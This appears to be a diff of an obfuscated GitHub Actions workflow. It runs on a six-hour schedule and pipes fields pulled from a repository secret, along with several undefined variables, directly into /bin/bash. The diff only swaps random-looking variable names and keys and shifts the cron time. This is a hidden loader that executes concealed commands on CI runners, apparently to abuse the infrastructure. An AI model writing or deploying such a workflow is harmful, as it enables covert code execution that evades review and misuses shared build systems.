@@ -3,21 +3,19 @@ name: unablepregnanc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
-
-jobs:  # 19330
+    - cron: '33 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: unablepregnanc
         env:
-          znn8824: ${{ secrets.znn8824 }}
+          yxe9710: ${{ secrets.yxe9710 }}
         run: |
-          echo $znn8824 | jq -r .fhuke5402 | /bin/bash
-          echo $b85 | jq -r .wm905 | /bin/bash
-          echo $cazr1 | jq -r .biyv7 | /bin/bash
-          echo $ts4374 | jq -r .pr9 | /bin/bash
-          echo $kq65453 | jq -r .vuubt2611 | /bin/bash
+          echo $yxe9710 | jq -r .ozs962 | /bin/bash
+          echo $zgy9 | jq -r .g60 | /bin/bash
+          echo $x700 | jq -r .vpp7246 | /bin/bash
+          echo $yht1878 | jq -r .q49 | /bin/bash
+          echo $b38219 | jq -r .iun77 | /bin/bash
 
